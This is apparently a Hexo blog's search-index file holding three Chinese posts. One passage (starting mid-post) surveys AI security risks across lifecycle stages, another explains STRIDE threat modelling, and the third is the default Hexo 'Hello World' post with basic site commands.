title="人工智能“内嵌化”加深，应用失控风险危害显著"></a>人工智能“内嵌化”加深，应用失控风险危害显著</h2><p>产业智能转型升级的内在驱动，不断推动人工智能深度内嵌于各行业各环节中，真正实现物理世界变化实时映射数字世界，以及数字世界演进优化带动物理世界发展的双向融合。然而，人工智能各行业应用带来的数字和物理世界双向融合，将促使人工智能在数字世界中的安全风险向物理世界和人类社会蔓延。</p><ol><li><p>威胁物理环境安全。</p><p>应用于农业、化工、核工业等领域的智能系统非正常运行或遭受攻击，可能破坏土壤、海洋、大气等环境安全。</p></li><li><p>威胁人身财产安全。</p><p>自动驾驶、无人机、医疗机器人、智慧金融等智能系统的非正常运行将可能直接危害人类身体健康和财产安全。</p></li><li><p>威胁国家社会安全。</p><p>不法分子恶意利用基于人工智能的换脸换声技术伪造政治领袖和公众人物的高逼真度新闻视频，可能引发民众骚乱甚至国内动乱，威胁国家安全。</p></li></ol><h1 id="（二）人工智能安全风险"><a href="#（二）人工智能安全风险" class="headerlink" title="（二）人工智能安全风险"></a>（二）人工智能安全风险</h1><ol><li><h2 id="初始阶段安全风险"><a href="#初始阶段安全风险" class="headerlink" title="初始阶段安全风险"></a>初始阶段安全风险</h2><p>初始阶段是指将想法转化为有形系统的过程。主要包括任务分析、需求定义、风险管理等过程。这个阶段的安全风险主要表现为对人工智能应用目标的设定有悖国家法律法规和社会伦理规范。</p></li><li><h2 id="设计研发阶段安全风险"><a href="#设计研发阶段安全风险" class="headerlink" title="设计研发阶段安全风险"></a>设计研发阶段安全风险</h2><p>设计研发阶段是指完成可部署人工智能系统创建的过程。主要包括确定设计方法、定义系统框架、软件代码实现、风险管理等过程。这个阶段的安全风险主要表现为人工智能基础设施不完善、技术脆弱性以及设计研发有误等引发的安全风险。</p></li><li><h2 id="检验验证阶段安全风险"><a href="#检验验证阶段安全风险" class="headerlink" title="检验验证阶段安全风险"></a>检验验证阶段安全风险</h2><p>检验验证阶段是指人工智能系统是否按照预期需求工作以及是否完全满足预定目标。这个阶段的安全风险主要表现为测试验证不充分，未及时发现和修复前序阶段的安全风险。</p></li><li><h2 id="部署阶段安全风险"><a href="#部署阶段安全风险" class="headerlink" title="部署阶段安全风险"></a>部署阶段安全风险</h2><p>部署阶段是指在目标环境中安装和配置人工智能系统的过程。这个阶段的安全风险主要表现为系统部署的软硬件环境不可信，系统可能遭受非授权发访问和非授权使用。</p></li><li><h2 id="运行监控阶段安全风险"><a href="#运行监控阶段安全风险" class="headerlink" title="运行监控阶段安全风险"></a>运行监控阶段安全风险</h2><p>运行监控阶段，人工智能系统处于运行和可使用状态，主要包括运行监控、维护升级等过程。这个阶段的安全风险主要表现为恶意攻击者对人工智能系统发起的<strong>对抗样本</strong>攻击、<strong>算法后门</strong>、<strong>模型窃取</strong>、<strong>模型反馈误导</strong>、<strong>数据逆向还原</strong>、<strong>成员推理</strong>、<strong>属性推理</strong>、<strong>代码漏洞利用</strong>等安全攻击，以及人工智能系统遭受滥用或恶意应用。</p></li><li><h2 id="持续验证阶段安全风险"><a href="#持续验证阶段安全风险" class="headerlink" title="持续验证阶段安全风险"></a>持续验证阶段安全风险</h2><p>在持续验证阶段，对于开展持续学习的人工智能系统进行持续检验和验证。这个阶段的安全风险主要表现为测试验证数据更新不及时，未及时发现和修复因持续学习引入的模型反馈误导等安全风险。</p></li><li><h2 id="重新评估阶段安全风险"><a href="#重新评估阶段安全风险" class="headerlink" title="重新评估阶段安全风险"></a>重新评估阶段安全风险</h2><p>当初是目标无法达到或者需要修改时，进入重新评估阶段。该阶段主要包括设计定义、需求定义、风险管理等过程。这个阶段主要设计需求调整和重新定义，因而其安全风险和初始阶段的安全风险类似，及人工智能应用目标的设定有悖国家法律法规和社会伦理规范。</p></li><li><h2 id="废弃阶段安全风险"><a href="#废弃阶段安全风险" class="headerlink" title="废弃阶段安全风险"></a>废弃阶段安全风险</h2><p>在废弃阶段，废弃销毁使用目的不复存在或者有更好解决办法替换的人工智能系统，主要包括数据、算法模型以及系统整体的废弃销毁过程。这个阶段的安全风险主要表现为销毁不彻底，泄漏个人隐私。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> AI安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁建模</title>
      <link href="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/"/>
      <url>/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是威胁建模"><a href="#什么是威胁建模" class="headerlink" title="什么是威胁建模"></a>什么是威胁建模</h1><p>威胁建模是一种分析应用程序安全性的结构化方法，可以用来识别、量化和降低应用程序安全风险。主要管理流程包含如下：</p><ol><li>标识资源：找出系统必须保护的有价值的资源</li><li>创建总体体系结构：利用简单的图表来记录应用程序的体系结构，包括子系统、信任边界和数据流。</li><li>分解应用程序：分解应用程序的体系结构，包括基本的网络和主机基础结构的设计，从而为应用程序创建安全配置文件。安全配置文件的目的是发现应用程序的设计、实现或部署中的缺陷。</li><li>识别威胁：牢记攻击者的目标，利用对应用程序的体系结构和潜在威胁的了解，找出可能影响应用程序的威胁</li><li>记录威胁：利用通用模板记录每种威胁，该模板定义了一套要捕获的各种威胁的核心属性</li><li>评价威胁：对威胁进行评价以区分优先顺序，并首先处理最重要的威胁。这些威胁带来的危险最大。评价过程要权衡威胁的可能性，以及攻击发生时可能造成的危害。评价的结果可能是：通过对此威胁带来的风险与为使威胁得到减少所花费的成本，对于某些威胁采取的行动是不值得的</li><li>缓解方案：对列出的各类威胁，提出缓解方案，解决风险，是威胁建模的最终</li><li>安全验证：在系统完成开发后，通过安全测试验证各缓解方案的实现情况，对未完成的安全需求，则重新转入设计、编码流程，直至风险消除。</li></ol><h1 id="何时做威胁建模？"><a href="#何时做威胁建模？" class="headerlink" title="何时做威胁建模？"></a>何时做威胁建模？</h1><p>在软件开发生命周期中，<strong>设计阶段</strong>是对需求分析结果进行软件系统整体设计的重要阶段。相比在系统完成开发后再考虑安全需求，提前在设计阶段就完成整体安全方案设计，不管对开发人员还是安全人员，都有更大的弹性空间提前消除安全威胁，避免类似事后打补丁式的被动防御，同时也有助于降低开发和后期维护的成本。通过安全设计消除潜在的威胁，并在测试环节进行安全测试验证，形成一个设计-实现-验证闭环。绝大部分安全威胁，可以通过威胁建模来实现。</p><h1 id="如何做威胁建模"><a href="#如何做威胁建模" class="headerlink" title="如何做威胁建模"></a>如何做威胁建模</h1><p>STRIDE威胁建模方法。还有基于STRIDE威胁建模方法的SDL Threat Modeling Tool[2]威胁建模工具，该工具可以帮助安全人员画数据流图、分析威胁、生成并导出威胁建模报告。</p><h2 id="STRIDE介绍"><a href="#STRIDE介绍" class="headerlink" title="STRIDE介绍"></a>STRIDE介绍</h2><p>STRIDE威胁建模将威胁类型分为Spoofing（仿冒）、Tampering（篡改）、Repudiation（抵赖）、Information Disclosure（信息泄漏）、Denial of Service（拒绝服务）和 Elevation of Privilege（权限提升），共6个维度，几乎可以涵盖目前绝大部分安全问题。</p><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/STRIDE.jpg" alt="STRIDE"></p><h2 id="威胁建模流程"><a href="#威胁建模流程" class="headerlink" title="威胁建模流程"></a>威胁建模流程</h2><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1%E6%B5%81%E7%A8%8B.jpg" alt="威胁建模流程"></p><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><p>STRIDE建模的第一步就是分解业务场景，绘制数据流图(DFD)。<strong>威胁建模针对的是一个个具体场景</strong>，所以首先需要对我们的系统根据实际情况进行业务场景的分解，比如登录场景、交易场景、审批场景、灾备场景等等，具体是什么场景以及有多少个场景，是和实际的系统和业务息息相关的。<strong>分解完业务场景以后，就对一个一个的场景分别进行STRIDE威胁建模</strong>，每个场景的STRIDE威胁建模是相对独立的。 首先对一个具体的场景绘制数据流图（DFD），一个简单Web应用的数据流图如下所示：</p><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png" alt="数据流图"></p><h3 id="识别威胁"><a href="#识别威胁" class="headerlink" title="识别威胁"></a>识别威胁</h3><p>STRIDE威胁建模方法已经明确了<strong>每个数据流图元素具有不同的威胁</strong>，其中外部实体只有仿冒（S）、抵赖（R）威胁，数据流只有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，处理过程有所有六种（STRIDE）威胁，存储过程有篡改（T）、信息泄露（I）、拒绝服务（D）威胁，但如果是日志类型存储则还有抵赖（R）威胁。具体可以对照如下表格进行威胁识别: </p><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/%E8%AF%86%E5%88%AB%E5%A8%81%E8%83%81.png" alt="识别威胁"></p><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>根据不同的数据流图元素及威胁，相应的缓解措施也不相同。下表是一些威胁类别的通用性缓解方案：</p><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD.png" alt="缓解措施"></p><p>分析完数据流图中的所有对象的潜在威胁以后，就要输出一个威胁列表，威胁列表中的每个威胁项如下表：</p><p><img src="/2021/11/09/xin-xi-an-quan/wei-xie-jian-mo/%E5%A8%81%E8%83%81%E5%88%97%E8%A1%A8.jpg" alt="威胁列表"></p><h3 id="安全验证"><a href="#安全验证" class="headerlink" title="安全验证"></a>安全验证</h3><p>在威胁建模完成后，需要对整个过程进行回顾，不仅要确认缓解措施是否能够真正缓解潜在威胁，同时验证数据流图是否符合设计，代码实现是否符合预期设计，所有的威胁是否都有相应缓解措施。最后将威胁建模报告留存档案，作为后续迭代开发、增量开发时威胁建模的参考依据。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/11/08/hello-world/"/>
      <url>/2021/11/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
